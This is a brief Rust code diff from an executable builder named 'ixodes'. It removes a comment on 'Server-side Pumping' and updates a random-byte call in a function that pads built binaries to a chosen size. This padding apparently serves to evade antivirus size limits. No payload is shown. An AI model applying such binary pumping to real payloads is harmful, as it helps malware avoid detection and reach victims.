@@ -408,7 +408,6 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
         });
     }
 
-    // Server-side Pumping: Inflate the binary size now so it's delivered pre-pumped
     if let Some(pump_mb) = request.settings.pump_size_mb {
         if pump_mb > 0 {
             if let Err(err) = pump_file_on_server(&exe_path, pump_mb) {
@@ -561,7 +560,7 @@ fn pump_file_on_server(path: &Path, target_mb: u32) -> Result<(), String> {
             2 => {
                 for i in (0..to_write).step_by(16) {
                     if rng.gen_bool(0.1) {
-                        buffer[i] = rng.gen();
+                        buffer[i] = rng.r#gen();
                     }
                 }
             }
